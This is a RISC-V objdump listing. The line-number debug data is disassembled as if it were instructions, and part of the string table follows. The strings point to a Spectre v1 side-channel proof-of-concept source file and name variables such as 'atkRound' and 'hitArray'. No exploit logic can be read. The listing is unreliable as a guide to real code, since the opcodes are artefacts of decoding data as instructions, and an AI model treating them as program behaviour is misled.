    17a8:	0002                	c.slli64	zero
    17aa:	0501                	addi	a0,a0,0
    17ac:	0032                	c.slli	zero,0xc
    17ae:	0402                	c.slli64	s0
    17b0:	0304                	addi	s1,sp,384
    17b2:	0900                	addi	s0,sp,144
    17b4:	000a                	c.slli	zero,0x2
    17b6:	0501                	addi	a0,a0,0
    17b8:	09040307          	0x9040307
    17bc:	0014                	0x14
    17be:	0501                	addi	a0,a0,0
    17c0:	0009                	c.nop	2
    17c2:	0402                	c.slli64	s0
    17c4:	0302                	c.slli64	t1
    17c6:	0901                	addi	s2,s2,0
    17c8:	0002                	c.slli64	zero
    17ca:	0501                	addi	a0,a0,0
    17cc:	001e                	c.slli	zero,0x7
    17ce:	0402                	c.slli64	s0
    17d0:	0302                	c.slli64	t1
    17d2:	097f                	0x97f
    17d4:	000e                	c.slli	zero,0x3
    17d6:	0501                	addi	a0,a0,0
    17d8:	04020007          	0x4020007
    17dc:	0301                	addi	t1,t1,0
    17de:	0900                	addi	s0,sp,144
    17e0:	000a                	c.slli	zero,0x2
    17e2:	0301                	addi	t1,t1,0
    17e4:	0902                	c.slli64	s2
    17e6:	000a                	c.slli	zero,0x2
    17e8:	0501                	addi	a0,a0,0
    17ea:	030d                	addi	t1,t1,3
    17ec:	0904                	addi	s1,sp,144
    17ee:	0002                	c.slli64	zero
    17f0:	0501                	addi	a0,a0,0
    17f2:	0900030b          	0x900030b
    17f6:	0012                	c.slli	zero,0x4
    17f8:	0301                	addi	t1,t1,0
    17fa:	0901                	addi	s2,s2,0
    17fc:	0004                	0x4
    17fe:	0501                	addi	a0,a0,0
    1800:	030a                	slli	t1,t1,0x2
    1802:	0900                	addi	s0,sp,144
    1804:	0004                	0x4
    1806:	0501                	addi	a0,a0,0
    1808:	0309                	addi	t1,t1,2
    180a:	0901                	addi	s2,s2,0
    180c:	0004                	0x4
    180e:	0501                	addi	a0,a0,0
    1810:	0310                	addi	a2,sp,384
    1812:	0901                	addi	s2,s2,0
    1814:	000e                	c.slli	zero,0x3
    1816:	0501                	addi	a0,a0,0
    1818:	0900030f          	0x900030f
    181c:	0004                	0x4
    181e:	0501                	addi	a0,a0,0
    1820:	030d                	addi	t1,t1,3
    1822:	0900                	addi	s0,sp,144
    1824:	0004                	0x4
    1826:	0501                	addi	a0,a0,0
    1828:	030c                	addi	a1,sp,384
    182a:	0902                	c.slli64	s2
    182c:	0004                	0x4
    182e:	0501                	addi	a0,a0,0
    1830:	09010307          	0x9010307
    1834:	0006                	c.slli	zero,0x1
    1836:	0501                	addi	a0,a0,0
    1838:	030c                	addi	a1,sp,384
    183a:	0904                	addi	s1,sp,144
    183c:	0002                	c.slli64	zero
    183e:	0501                	addi	a0,a0,0
    1840:	09010307          	0x9010307
    1844:	0006                	c.slli	zero,0x1
    1846:	0501                	addi	a0,a0,0
    1848:	030c                	addi	a1,sp,384
    184a:	0905                	addi	s2,s2,1
    184c:	0002                	c.slli64	zero
    184e:	0501                	addi	a0,a0,0
    1850:	09010307          	0x9010307
    1854:	0006                	c.slli	zero,0x1
    1856:	0501                	addi	a0,a0,0
    1858:	030d                	addi	t1,t1,3
    185a:	0905                	addi	s2,s2,1
    185c:	0002                	c.slli64	zero
    185e:	0501                	addi	a0,a0,0
    1860:	09010307          	0x9010307
    1864:	0006                	c.slli	zero,0x1
    1866:	0301                	addi	t1,t1,0
    1868:	0901                	addi	s2,s2,0
    186a:	000e                	c.slli	zero,0x3
    186c:	0501                	addi	a0,a0,0
    186e:	030c                	addi	a1,sp,384
    1870:	0905                	addi	s2,s2,1
    1872:	000e                	c.slli	zero,0x3
    1874:	0501                	addi	a0,a0,0
    1876:	030d                	addi	t1,t1,3
    1878:	0902                	c.slli64	s2
    187a:	0006                	c.slli	zero,0x1
    187c:	0501                	addi	a0,a0,0
    187e:	09020307          	0x9020307
    1882:	0014                	0x14
    1884:	0301                	addi	t1,t1,0
    1886:	0901                	addi	s2,s2,0
    1888:	001e                	c.slli	zero,0x7
    188a:	0301                	addi	t1,t1,0
    188c:	0904                	addi	s1,sp,144
    188e:	0002                	c.slli64	zero
    1890:	0301                	addi	t1,t1,0
    1892:	0901                	addi	s2,s2,0
    1894:	000c                	0xc
    1896:	0301                	addi	t1,t1,0
    1898:	0904                	addi	s1,sp,144
    189a:	0002                	c.slli64	zero
    189c:	0501                	addi	a0,a0,0
    189e:	0901030b          	0x901030b
    18a2:	000e                	c.slli	zero,0x3
    18a4:	0501                	addi	a0,a0,0
    18a6:	09010307          	0x9010307
    18aa:	0008                	0x8
    18ac:	0501                	addi	a0,a0,0
    18ae:	7ef8030b          	0x7ef8030b
    18b2:	0209                	addi	tp,tp,2
    18b4:	0100                	addi	s0,sp,128
    18b6:	0905                	addi	s2,s2,1
    18b8:	02090203          	lb	tp,32(s2)
    18bc:	0100                	addi	s0,sp,128
    18be:	0105                	addi	sp,sp,1
    18c0:	09018903          	lb	s2,144(gp) # 80003470 <__global_pointer$+0x90>
    18c4:	0002                	c.slli64	zero
    18c6:	0301                	addi	t1,t1,0
    18c8:	000c0903          	lb	s2,0(s8)
    18cc:	0501                	addi	a0,a0,0
    18ce:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    18d2:	001e                	c.slli	zero,0x7
    18d4:	0301                	addi	t1,t1,0
    18d6:	0902                	c.slli64	s2
    18d8:	0014                	0x14
    18da:	0501                	addi	a0,a0,0
    18dc:	030a                	slli	t1,t1,0x2
    18de:	00180903          	lb	s2,1(a6)
    18e2:	0501                	addi	a0,a0,0
    18e4:	0301                	addi	t1,t1,0
    18e6:	0901                	addi	s2,s2,0
    18e8:	0002                	c.slli64	zero
    18ea:	0501                	addi	a0,a0,0
    18ec:	09090303          	lb	t1,144(s2)
    18f0:	000a                	c.slli	zero,0x2
    18f2:	0501                	addi	a0,a0,0
    18f4:	030c                	addi	a1,sp,384
    18f6:	0901                	addi	s2,s2,0
    18f8:	0014                	0x14
    18fa:	0501                	addi	a0,a0,0
    18fc:	0306                	slli	t1,t1,0x1
    18fe:	0901                	addi	s2,s2,0
    1900:	0008                	0x8
    1902:	0501                	addi	a0,a0,0
    1904:	030c                	addi	a1,sp,384
    1906:	0900                	addi	s0,sp,144
    1908:	0006                	c.slli	zero,0x1
    190a:	0501                	addi	a0,a0,0
    190c:	0306                	slli	t1,t1,0x1
    190e:	0901                	addi	s2,s2,0
    1910:	000c                	0xc
    1912:	0501                	addi	a0,a0,0
    1914:	030c                	addi	a1,sp,384
    1916:	0900                	addi	s0,sp,144
    1918:	0006                	c.slli	zero,0x1
    191a:	0501                	addi	a0,a0,0
    191c:	09010303          	lb	t1,144(sp)
    1920:	000a                	c.slli	zero,0x2
    1922:	0501                	addi	a0,a0,0
    1924:	0301                	addi	t1,t1,0
    1926:	0976                	slli	s2,s2,0x1d
    1928:	0008                	0x8
    192a:	0401                	addi	s0,s0,0
    192c:	03050503          	lb	a0,48(a0) # fffffffffffeb030 <_end+0xffffffff7ffcfb70>
    1930:	20097f8b          	0x20097f8b
    1934:	0100                	addi	s0,sp,128
    1936:	0204                	addi	s1,sp,256
    1938:	0905                	addi	s2,s2,1
    193a:	0900f703          	0x900f703
    193e:	004c                	addi	a1,sp,4
    1940:	0501                	addi	a0,a0,0
    1942:	09010303          	lb	t1,144(sp)
    1946:	0008                	0x8
    1948:	0301                	addi	t1,t1,0
    194a:	0909                	addi	s2,s2,2
    194c:	0014                	0x14
    194e:	0301                	addi	t1,t1,0
    1950:	0901                	addi	s2,s2,0
    1952:	001a                	c.slli	zero,0x6
    1954:	0501                	addi	a0,a0,0
    1956:	0308                	addi	a0,sp,384
    1958:	0900                	addi	s0,sp,144
    195a:	0004                	0x4
    195c:	0501                	addi	a0,a0,0
    195e:	030e                	slli	t1,t1,0x3
    1960:	00040903          	lb	s2,0(s0)
    1964:	0501                	addi	a0,a0,0
    1966:	0301                	addi	t1,t1,0
    1968:	0901                	addi	s2,s2,0
    196a:	000e                	c.slli	zero,0x3
    196c:	0301                	addi	t1,t1,0
    196e:	000a0903          	lb	s2,0(s4)
    1972:	0501                	addi	a0,a0,0
    1974:	0309                	addi	t1,t1,2
    1976:	0901                	addi	s2,s2,0
    1978:	0012                	c.slli	zero,0x4
    197a:	0501                	addi	a0,a0,0
    197c:	0900031b          	addiw	t1,zero,144
    1980:	0004                	0x4
    1982:	0501                	addi	a0,a0,0
    1984:	0319                	addi	t1,t1,6
    1986:	0900                	addi	s0,sp,144
    1988:	0004                	0x4
    198a:	0501                	addi	a0,a0,0
    198c:	032a                	slli	t1,t1,0xa
    198e:	0900                	addi	s0,sp,144
    1990:	0002                	c.slli64	zero
    1992:	0501                	addi	a0,a0,0
    1994:	0331                	addi	t1,t1,12
    1996:	0900                	addi	s0,sp,144
    1998:	0006                	c.slli	zero,0x1
    199a:	0501                	addi	a0,a0,0
    199c:	0306                	slli	t1,t1,0x1
    199e:	0900                	addi	s0,sp,144
    19a0:	0002                	c.slli64	zero
    19a2:	0501                	addi	a0,a0,0
    19a4:	0316                	slli	t1,t1,0x5
    19a6:	0901                	addi	s2,s2,0
    19a8:	0002                	c.slli64	zero
    19aa:	0501                	addi	a0,a0,0
    19ac:	0310                	addi	a2,sp,384
    19ae:	0901                	addi	s2,s2,0
    19b0:	0008                	0x8
    19b2:	0501                	addi	a0,a0,0
    19b4:	0901030b          	0x901030b
    19b8:	0008                	0x8
    19ba:	0501                	addi	a0,a0,0
    19bc:	0310                	addi	a2,sp,384
    19be:	0901                	addi	s2,s2,0
    19c0:	0002                	c.slli64	zero
    19c2:	0501                	addi	a0,a0,0
    19c4:	0309                	addi	t1,t1,2
    19c6:	0900                	addi	s0,sp,144
    19c8:	000c                	0xc
    19ca:	0501                	addi	a0,a0,0
    19cc:	030e                	slli	t1,t1,0x3
    19ce:	0900                	addi	s0,sp,144
    19d0:	000c                	0xc
    19d2:	0501                	addi	a0,a0,0
    19d4:	030c                	addi	a1,sp,384
    19d6:	0900                	addi	s0,sp,144
    19d8:	0002                	c.slli64	zero
    19da:	0501                	addi	a0,a0,0
    19dc:	0322                	slli	t1,t1,0x8
    19de:	097f                	0x97f
    19e0:	0002                	c.slli64	zero
    19e2:	0501                	addi	a0,a0,0
    19e4:	0900030b          	0x900030b
    19e8:	000a                	c.slli	zero,0x2
    19ea:	0501                	addi	a0,a0,0
    19ec:	0311                	addi	t1,t1,4
    19ee:	000a0903          	lb	s2,0(s4)
    19f2:	0501                	addi	a0,a0,0
    19f4:	0901030b          	0x901030b
    19f8:	0008                	0x8
    19fa:	0301                	addi	t1,t1,0
    19fc:	0901                	addi	s2,s2,0
    19fe:	0008                	0x8
    1a00:	0501                	addi	a0,a0,0
    1a02:	0310                	addi	a2,sp,384
    1a04:	0901                	addi	s2,s2,0
    1a06:	0002                	c.slli64	zero
    1a08:	0501                	addi	a0,a0,0
    1a0a:	0309                	addi	t1,t1,2
    1a0c:	0900                	addi	s0,sp,144
    1a0e:	000c                	0xc
    1a10:	0501                	addi	a0,a0,0
    1a12:	030e                	slli	t1,t1,0x3
    1a14:	0900                	addi	s0,sp,144
    1a16:	000c                	0xc
    1a18:	0501                	addi	a0,a0,0
    1a1a:	030c                	addi	a1,sp,384
    1a1c:	0900                	addi	s0,sp,144
    1a1e:	0004                	0x4
    1a20:	0501                	addi	a0,a0,0
    1a22:	031d                	addi	t1,t1,7
    1a24:	097f                	0x97f
    1a26:	0004                	0x4
    1a28:	0501                	addi	a0,a0,0
    1a2a:	0900030b          	0x900030b
    1a2e:	000a                	c.slli	zero,0x2
    1a30:	0501                	addi	a0,a0,0
    1a32:	030a                	slli	t1,t1,0x2
    1a34:	00080903          	lb	s2,0(a6)
    1a38:	0501                	addi	a0,a0,0
    1a3a:	0301                	addi	t1,t1,0
    1a3c:	0901                	addi	s2,s2,0
    1a3e:	0004                	0x4
    1a40:	0301                	addi	t1,t1,0
    1a42:	00080903          	lb	s2,0(a6)
    1a46:	0501                	addi	a0,a0,0
    1a48:	0309                	addi	t1,t1,2
    1a4a:	0901                	addi	s2,s2,0
    1a4c:	0014                	0x14
    1a4e:	0501                	addi	a0,a0,0
    1a50:	0319                	addi	t1,t1,6
    1a52:	0900                	addi	s0,sp,144
    1a54:	0004                	0x4
    1a56:	0501                	addi	a0,a0,0
    1a58:	0320                	addi	s0,sp,392
    1a5a:	0900                	addi	s0,sp,144
    1a5c:	0006                	c.slli	zero,0x1
    1a5e:	0501                	addi	a0,a0,0
    1a60:	0306                	slli	t1,t1,0x1
    1a62:	0900                	addi	s0,sp,144
    1a64:	0002                	c.slli64	zero
    1a66:	0501                	addi	a0,a0,0
    1a68:	0901031b          	addiw	t1,sp,144
    1a6c:	0002                	c.slli64	zero
    1a6e:	0501                	addi	a0,a0,0
    1a70:	0900030f          	0x900030f
    1a74:	0004                	0x4
    1a76:	0501                	addi	a0,a0,0
    1a78:	0312                	slli	t1,t1,0x4
    1a7a:	0901                	addi	s2,s2,0
    1a7c:	0008                	0x8
    1a7e:	0501                	addi	a0,a0,0
    1a80:	030a                	slli	t1,t1,0x2
    1a82:	0900                	addi	s0,sp,144
    1a84:	0006                	c.slli	zero,0x1
    1a86:	0501                	addi	a0,a0,0
    1a88:	0312                	slli	t1,t1,0x4
    1a8a:	0901                	addi	s2,s2,0
    1a8c:	000a                	c.slli	zero,0x2
    1a8e:	0501                	addi	a0,a0,0
    1a90:	030a                	slli	t1,t1,0x2
    1a92:	0900                	addi	s0,sp,144
    1a94:	0006                	c.slli	zero,0x1
    1a96:	0501                	addi	a0,a0,0
    1a98:	0318                	addi	a4,sp,384
    1a9a:	0901                	addi	s2,s2,0
    1a9c:	000a                	c.slli	zero,0x2
    1a9e:	0501                	addi	a0,a0,0
    1aa0:	030a                	slli	t1,t1,0x2
    1aa2:	0900                	addi	s0,sp,144
    1aa4:	0006                	c.slli	zero,0x1
    1aa6:	0501                	addi	a0,a0,0
    1aa8:	0310                	addi	a2,sp,384
    1aaa:	0902                	c.slli64	s2
    1aac:	000a                	c.slli	zero,0x2
    1aae:	0501                	addi	a0,a0,0
    1ab0:	0901030b          	0x901030b
    1ab4:	0008                	0x8
    1ab6:	0501                	addi	a0,a0,0
    1ab8:	0309                	addi	t1,t1,2
    1aba:	0901                	addi	s2,s2,0
    1abc:	0002                	c.slli64	zero
    1abe:	0501                	addi	a0,a0,0
    1ac0:	030c                	addi	a1,sp,384
    1ac2:	0900                	addi	s0,sp,144
    1ac4:	000c                	0xc
    1ac6:	0501                	addi	a0,a0,0
    1ac8:	0322                	slli	t1,t1,0x8
    1aca:	097f                	0x97f
    1acc:	0006                	c.slli	zero,0x1
    1ace:	0501                	addi	a0,a0,0
    1ad0:	0900030b          	0x900030b
    1ad4:	000a                	c.slli	zero,0x2
    1ad6:	0301                	addi	t1,t1,0
    1ad8:	000a0903          	lb	s2,0(s4)
    1adc:	0301                	addi	t1,t1,0
    1ade:	0901                	addi	s2,s2,0
    1ae0:	0008                	0x8
    1ae2:	0501                	addi	a0,a0,0
    1ae4:	0309                	addi	t1,t1,2
    1ae6:	0901                	addi	s2,s2,0
    1ae8:	0002                	c.slli64	zero
    1aea:	0501                	addi	a0,a0,0
    1aec:	030c                	addi	a1,sp,384
    1aee:	0900                	addi	s0,sp,144
    1af0:	000c                	0xc
    1af2:	0501                	addi	a0,a0,0
    1af4:	031d                	addi	t1,t1,7
    1af6:	097f                	0x97f
    1af8:	000c                	0xc
    1afa:	0501                	addi	a0,a0,0
    1afc:	0900030b          	0x900030b
    1b00:	000a                	c.slli	zero,0x2
    1b02:	0501                	addi	a0,a0,0
    1b04:	030a                	slli	t1,t1,0x2
    1b06:	00080903          	lb	s2,0(a6)
    1b0a:	0501                	addi	a0,a0,0
    1b0c:	0301                	addi	t1,t1,0
    1b0e:	0901                	addi	s2,s2,0
    1b10:	0004                	0x4
    1b12:	0301                	addi	t1,t1,0
    1b14:	00080903          	lb	s2,0(a6)
    1b18:	0501                	addi	a0,a0,0
    1b1a:	0901030f          	0x901030f
    1b1e:	000a                	c.slli	zero,0x2
    1b20:	0501                	addi	a0,a0,0
    1b22:	0309                	addi	t1,t1,2
    1b24:	0901                	addi	s2,s2,0
    1b26:	0008                	0x8
    1b28:	0501                	addi	a0,a0,0
    1b2a:	0306                	slli	t1,t1,0x1
    1b2c:	0901                	addi	s2,s2,0
    1b2e:	0002                	c.slli64	zero
    1b30:	0501                	addi	a0,a0,0
    1b32:	030a                	slli	t1,t1,0x2
    1b34:	097f                	0x97f
    1b36:	000a                	c.slli	zero,0x2
    1b38:	0501                	addi	a0,a0,0
    1b3a:	0309                	addi	t1,t1,2
    1b3c:	0900                	addi	s0,sp,144
    1b3e:	0008                	0x8
    1b40:	0501                	addi	a0,a0,0
    1b42:	030c                	addi	a1,sp,384
    1b44:	0902                	c.slli64	s2
    1b46:	0002                	c.slli64	zero
    1b48:	0501                	addi	a0,a0,0
    1b4a:	0301                	addi	t1,t1,0
    1b4c:	0901                	addi	s2,s2,0
    1b4e:	000c                	0xc
    1b50:	0301                	addi	t1,t1,0
    1b52:	00080903          	lb	s2,0(a6)
    1b56:	0501                	addi	a0,a0,0
    1b58:	0901030f          	0x901030f
    1b5c:	000e                	c.slli	zero,0x3
    1b5e:	0501                	addi	a0,a0,0
    1b60:	0309                	addi	t1,t1,2
    1b62:	0901                	addi	s2,s2,0
    1b64:	0008                	0x8
    1b66:	0501                	addi	a0,a0,0
    1b68:	0306                	slli	t1,t1,0x1
    1b6a:	0901                	addi	s2,s2,0
    1b6c:	0002                	c.slli64	zero
    1b6e:	0501                	addi	a0,a0,0
    1b70:	097f030b          	0x97f030b
    1b74:	000a                	c.slli	zero,0x2
    1b76:	0501                	addi	a0,a0,0
    1b78:	0309                	addi	t1,t1,2
    1b7a:	0900                	addi	s0,sp,144
    1b7c:	000c                	0xc
    1b7e:	0501                	addi	a0,a0,0
    1b80:	0011                	c.nop	4
    1b82:	0402                	c.slli64	s0
    1b84:	0301                	addi	t1,t1,0
    1b86:	0900                	addi	s0,sp,144
    1b88:	0002                	c.slli64	zero
    1b8a:	0501                	addi	a0,a0,0
    1b8c:	000e                	c.slli	zero,0x3
    1b8e:	0402                	c.slli64	s0
    1b90:	0301                	addi	t1,t1,0
    1b92:	0900                	addi	s0,sp,144
    1b94:	0008                	0x8
    1b96:	0501                	addi	a0,a0,0
    1b98:	030c                	addi	a1,sp,384
    1b9a:	0902                	c.slli64	s2
    1b9c:	0002                	c.slli64	zero
    1b9e:	0501                	addi	a0,a0,0
    1ba0:	0301                	addi	t1,t1,0
    1ba2:	0901                	addi	s2,s2,0
    1ba4:	000c                	0xc
    1ba6:	0301                	addi	t1,t1,0
    1ba8:	00080903          	lb	s2,0(a6)
    1bac:	0501                	addi	a0,a0,0
    1bae:	000d                	c.nop	3
    1bb0:	0402                	c.slli64	s0
    1bb2:	0302                	c.slli64	t1
    1bb4:	0904                	addi	s1,sp,144
    1bb6:	000e                	c.slli	zero,0x3
    1bb8:	0501                	addi	a0,a0,0
    1bba:	0008                	0x8
    1bbc:	0402                	c.slli64	s0
    1bbe:	0302                	c.slli64	t1
    1bc0:	0900                	addi	s0,sp,144
    1bc2:	000c                	0xc
    1bc4:	0501                	addi	a0,a0,0
    1bc6:	000d                	c.nop	3
    1bc8:	0402                	c.slli64	s0
    1bca:	0302                	c.slli64	t1
    1bcc:	0901                	addi	s2,s2,0
    1bce:	0008                	0x8
    1bd0:	0501                	addi	a0,a0,0
    1bd2:	0008                	0x8
    1bd4:	0402                	c.slli64	s0
    1bd6:	0302                	c.slli64	t1
    1bd8:	0900                	addi	s0,sp,144
    1bda:	000c                	0xc
    1bdc:	0501                	addi	a0,a0,0
    1bde:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    1be2:	0302                	c.slli64	t1
    1be4:	0901                	addi	s2,s2,0
    1be6:	0008                	0x8
    1be8:	0501                	addi	a0,a0,0
    1bea:	0014                	0x14
    1bec:	0402                	c.slli64	s0
    1bee:	0301                	addi	t1,t1,0
    1bf0:	0900                	addi	s0,sp,144
    1bf2:	000a                	c.slli	zero,0x2
    1bf4:	0501                	addi	a0,a0,0
    1bf6:	030d                	addi	t1,t1,3
    1bf8:	0902                	c.slli64	s2
    1bfa:	0014                	0x14
    1bfc:	0501                	addi	a0,a0,0
    1bfe:	0301                	addi	t1,t1,0
    1c00:	0901                	addi	s2,s2,0
    1c02:	0014                	0x14
    1c04:	0301                	addi	t1,t1,0
    1c06:	00080903          	lb	s2,0(a6)
    1c0a:	0501                	addi	a0,a0,0
    1c0c:	0309                	addi	t1,t1,2
    1c0e:	0901                	addi	s2,s2,0
    1c10:	000e                	c.slli	zero,0x3
    1c12:	0301                	addi	t1,t1,0
    1c14:	0901                	addi	s2,s2,0
    1c16:	0008                	0x8
    1c18:	0501                	addi	a0,a0,0
    1c1a:	0016                	c.slli	zero,0x5
    1c1c:	0402                	c.slli64	s0
    1c1e:	0301                	addi	t1,t1,0
    1c20:	0900                	addi	s0,sp,144
    1c22:	0002                	c.slli64	zero
    1c24:	0501                	addi	a0,a0,0
    1c26:	000d                	c.nop	3
    1c28:	0402                	c.slli64	s0
    1c2a:	0301                	addi	t1,t1,0
    1c2c:	0900                	addi	s0,sp,144
    1c2e:	000c                	0xc
    1c30:	0501                	addi	a0,a0,0
    1c32:	0012                	c.slli	zero,0x4
    1c34:	0402                	c.slli64	s0
    1c36:	0301                	addi	t1,t1,0
    1c38:	0900                	addi	s0,sp,144
    1c3a:	000c                	0xc
    1c3c:	0501                	addi	a0,a0,0
    1c3e:	0010                	0x10
    1c40:	0402                	c.slli64	s0
    1c42:	0301                	addi	t1,t1,0
    1c44:	0900                	addi	s0,sp,144
    1c46:	0004                	0x4
    1c48:	0501                	addi	a0,a0,0
    1c4a:	0402000b          	0x402000b
    1c4e:	0301                	addi	t1,t1,0
    1c50:	0900                	addi	s0,sp,144
    1c52:	0004                	0x4
    1c54:	0501                	addi	a0,a0,0
    1c56:	0009                	c.nop	2
    1c58:	0402                	c.slli64	s0
    1c5a:	0301                	addi	t1,t1,0
    1c5c:	0900                	addi	s0,sp,144
    1c5e:	0004                	0x4
    1c60:	0501                	addi	a0,a0,0
    1c62:	030a                	slli	t1,t1,0x2
    1c64:	0902                	c.slli64	s2
    1c66:	0002                	c.slli64	zero
    1c68:	0501                	addi	a0,a0,0
    1c6a:	0301                	addi	t1,t1,0
    1c6c:	0901                	addi	s2,s2,0
    1c6e:	0004                	0x4
    1c70:	0301                	addi	t1,t1,0
    1c72:	00080903          	lb	s2,0(a6)
    1c76:	0501                	addi	a0,a0,0
    1c78:	0308                	addi	a0,sp,384
    1c7a:	0901                	addi	s2,s2,0
    1c7c:	000a                	c.slli	zero,0x2
    1c7e:	0501                	addi	a0,a0,0
    1c80:	09010307          	0x9010307
    1c84:	0004                	0x4
    1c86:	0501                	addi	a0,a0,0
    1c88:	0309                	addi	t1,t1,2
    1c8a:	0902                	c.slli64	s2
    1c8c:	0004                	0x4
    1c8e:	0501                	addi	a0,a0,0
    1c90:	0308                	addi	a0,sp,384
    1c92:	0901                	addi	s2,s2,0
    1c94:	0002                	c.slli64	zero
    1c96:	0501                	addi	a0,a0,0
    1c98:	030a                	slli	t1,t1,0x2
    1c9a:	097f                	0x97f
    1c9c:	000a                	c.slli	zero,0x2
    1c9e:	0501                	addi	a0,a0,0
    1ca0:	0309                	addi	t1,t1,2
    1ca2:	0900                	addi	s0,sp,144
    1ca4:	0008                	0x8
    1ca6:	0501                	addi	a0,a0,0
    1ca8:	09030307          	0x9030307
    1cac:	000a                	c.slli	zero,0x2
    1cae:	0501                	addi	a0,a0,0
    1cb0:	0306                	slli	t1,t1,0x1
    1cb2:	0900                	addi	s0,sp,144
    1cb4:	0008                	0x8
    1cb6:	0501                	addi	a0,a0,0
    1cb8:	0016                	c.slli	zero,0x5
    1cba:	0402                	c.slli64	s0
    1cbc:	0301                	addi	t1,t1,0
    1cbe:	0900                	addi	s0,sp,144
    1cc0:	000a                	c.slli	zero,0x2
    1cc2:	0501                	addi	a0,a0,0
    1cc4:	04020013          	addi	zero,tp,64 # 40 <buf.2990>
    1cc8:	0301                	addi	t1,t1,0
    1cca:	0900                	addi	s0,sp,144
    1ccc:	0008                	0x8
    1cce:	0501                	addi	a0,a0,0
    1cd0:	030c                	addi	a1,sp,384
    1cd2:	0901                	addi	s2,s2,0
    1cd4:	000a                	c.slli	zero,0x2
    1cd6:	0501                	addi	a0,a0,0
    1cd8:	0311                	addi	t1,t1,4
    1cda:	0900                	addi	s0,sp,144
    1cdc:	0008                	0x8
    1cde:	0501                	addi	a0,a0,0
    1ce0:	030a                	slli	t1,t1,0x2
    1ce2:	0900                	addi	s0,sp,144
    1ce4:	0014                	0x14
    1ce6:	0501                	addi	a0,a0,0
    1ce8:	0308                	addi	a0,sp,384
    1cea:	0901                	addi	s2,s2,0
    1cec:	0004                	0x4
    1cee:	0501                	addi	a0,a0,0
    1cf0:	0309                	addi	t1,t1,2
    1cf2:	000a0903          	lb	s2,0(s4)
    1cf6:	0301                	addi	t1,t1,0
    1cf8:	0901                	addi	s2,s2,0
    1cfa:	0002                	c.slli64	zero
    1cfc:	0501                	addi	a0,a0,0
    1cfe:	0310                	addi	a2,sp,384
    1d00:	0901                	addi	s2,s2,0
    1d02:	0010                	0x10
    1d04:	0501                	addi	a0,a0,0
    1d06:	030c                	addi	a1,sp,384
    1d08:	0900                	addi	s0,sp,144
    1d0a:	000c                	0xc
    1d0c:	0501                	addi	a0,a0,0
    1d0e:	09000313          	li	t1,144
    1d12:	0006                	c.slli	zero,0x1
    1d14:	0501                	addi	a0,a0,0
    1d16:	0309                	addi	t1,t1,2
    1d18:	0900                	addi	s0,sp,144
    1d1a:	0008                	0x8
    1d1c:	0501                	addi	a0,a0,0
    1d1e:	030a                	slli	t1,t1,0x2
    1d20:	097e                	slli	s2,s2,0x1f
    1d22:	000a                	c.slli	zero,0x2
    1d24:	0501                	addi	a0,a0,0
    1d26:	0309                	addi	t1,t1,2
    1d28:	0900                	addi	s0,sp,144
    1d2a:	0008                	0x8
    1d2c:	0501                	addi	a0,a0,0
    1d2e:	0316                	slli	t1,t1,0x5
    1d30:	0905                	addi	s2,s2,1
    1d32:	0002                	c.slli64	zero
    1d34:	0001                	nop
    1d36:	0402                	c.slli64	s0
    1d38:	0601                	addi	a2,a2,0
    1d3a:	08090003          	lb	zero,128(s2)
    1d3e:	0100                	addi	s0,sp,128
    1d40:	0200                	addi	s0,sp,256
    1d42:	0204                	addi	s1,sp,256
    1d44:	0a090003          	lb	zero,160(s2)
    1d48:	0100                	addi	s0,sp,128
    1d4a:	0105                	addi	sp,sp,1
    1d4c:	0200                	addi	s0,sp,256
    1d4e:	0504                	addi	s1,sp,640
    1d50:	0306                	slli	t1,t1,0x1
    1d52:	0901                	addi	s2,s2,0
    1d54:	0004                	0x4
    1d56:	0901                	addi	s2,s2,0
    1d58:	0008                	0x8
    1d5a:	0100                	addi	s0,sp,128
    1d5c:	01              	地址 0x0000000000001d5c 越界。


Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	2f637273          	csrrci	tp,0x2f6,6
   4:	63657073          	csrci	0x636,10
   8:	7274                	ld	a3,224(a2)
   a:	2d65                	addiw	s10,s10,25
   c:	3176                	fld	ft2,376(sp)
   e:	632e                	ld	t1,200(sp)
  10:	7500                	ld	s0,40(a0)
  12:	756e                	ld	a0,248(sp)
  14:	31646573          	csrrsi	a0,0x316,8
  18:	6100                	ld	s0,0(a0)
  1a:	6b74                	ld	a3,208(a4)
  1c:	6f52                	ld	t5,272(sp)
  1e:	6e75                	lui	t3,0x1d
  20:	0064                	addi	s1,sp,12
  22:	725f 6e61 3464      	0x34646e61725f
  28:	0038                	addi	a4,sp,8
  2a:	655f 656d 6772      	0x6772656d655f
  30:	6e65                	lui	t3,0x19
  32:	5f007963          	bgeu	zero,a6,624 <_tbss_end+0x5a0>
  36:	755f 6e69 3874      	0x38746e69755f
  3c:	745f 7300 7465      	0x74657300745f
  42:	7366664f          	fnmadd.d	fa2,fa2,fs6,fa4,unknown
  46:	7465                	lui	s0,0xffff9
  48:	7000                	ld	s0,32(s0)
  4a:	7361                	lui	t1,0xffff8
  4c:	496e4973          	0x496e4973
  50:	7864                	ld	s1,240(s0)
  52:	5f00                	lw	s0,56(a4)
  54:	74726377          	0x74726377
  58:	5f626d6f          	jal	s10,2664e <_tbss_end+0x265ca>
  5c:	74617473          	csrrci	s0,0x746,2
  60:	0065                	c.nop	25
  62:	775f 7363 7472      	0x74727363775f
  68:	73626d6f          	jal	s10,2679e <_tbss_end+0x2671a>
  6c:	735f 6174 6574      	0x65746174735f
  72:	6c00                	ld	s0,24(s0)
  74:	20676e6f          	jal	t3,7627a <_tbss_end+0x761f6>
  78:	6f6c                	ld	a1,216(a4)
  7a:	676e                	ld	a4,216(sp)
  7c:	7520                	ld	s0,104(a0)
  7e:	736e                	ld	t1,248(sp)
  80:	6769                	lui	a4,0x1a
  82:	656e                	ld	a0,216(sp)
  84:	2064                	fld	fs1,192(s0)
  86:	6e69                	lui	t3,0x1a
  88:	0074                	addi	a3,sp,12
  8a:	6c5f 6662 6973      	0x697366626c5f
  90:	657a                	ld	a0,408(sp)
  92:	6100                	ld	s0,0(a0)
  94:	6464                	ld	s1,200(s0)
  96:	0072                	c.slli	zero,0x1c
  98:	5f5f 6e69 3674      	0x36746e695f5f
  9e:	5f34                	lw	a3,120(a4)
  a0:	0074                	addi	a3,sp,12
  a2:	5f5f 6f6c 6163      	0x61636f6c5f5f
  a8:	656c                	ld	a1,200(a0)
  aa:	745f 6800 7469      	0x74696800745f
  b0:	7241                	lui	tp,0xffff0
  b2:	6172                	ld	sp,280(sp)
  b4:	0079                	c.nop	30
